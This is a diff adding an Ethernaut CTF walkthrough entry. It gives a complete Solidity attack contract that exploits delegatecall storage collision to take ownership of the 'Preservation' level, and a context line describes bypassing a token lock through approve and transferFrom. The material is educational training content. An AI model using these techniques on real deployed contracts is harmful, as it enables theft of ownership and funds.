@@ -552,3 +552,48 @@ To check allowed token to transfer: (await contract.allowance(player, player)).t
 
 ERC20 has 3 optional function and 6 mandatory function. In the CTF contract only `transfer` function has `lockTokens ` modifier but we can use `approve` function approve other user to spend the tokens for this challenge we approve ourselves for spender and then we can use `transferFrom` function to send all token to any address to solve the challenge.
 
+
+# 16. [Challenge 16: Preservation](https://ethernaut.openzeppelin.com/level/0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F)
+
+Tasks:
+- The goal of this level is for you to claim ownership of the instance you are given.
+
+**Solution:** \
+Attack Payload:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+contract Attack {
+    // Make sure the storage layout is the same as Preservation
+    // This will allow us to correctly update the state variables
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    Preservation public hackMe;
+
+    constructor(Preservation _hackMe) public {
+        hackMe = Preservation(_hackMe);
+    }
+
+    function attack() public {
+        // this will execute setTime function Preservation contract. 
+        // Then HackeMe contract delegatecall the LibraryContract contract and 
+        // it will change Preservation contract's timeZone1Library state variable to our address
+        hackMe.setFirstTime(uint(uint160(address(this))));
+        // pass any number as input, the function setTime() below will
+        // be called and it will execute Attacker contract setTime function and 
+        // change the Preservation contract's owner address to Attacker contract's address
+        hackMe.setFirstTime(1);
+    }
+
+    // function signature must match HackMe.doSomething()
+    function setTime(uint _num) public {
+        owner = msg.sender;
+    }
+}
+```
+
+Inside `attack()`, the first call to `setTime()` changes the address of `LibraryContract` store in `Preservation`. Address of `LibraryContract` is now set to Attack. The second call to `setTime()` calls `Attack.setTime()` and here we change the owner.
+
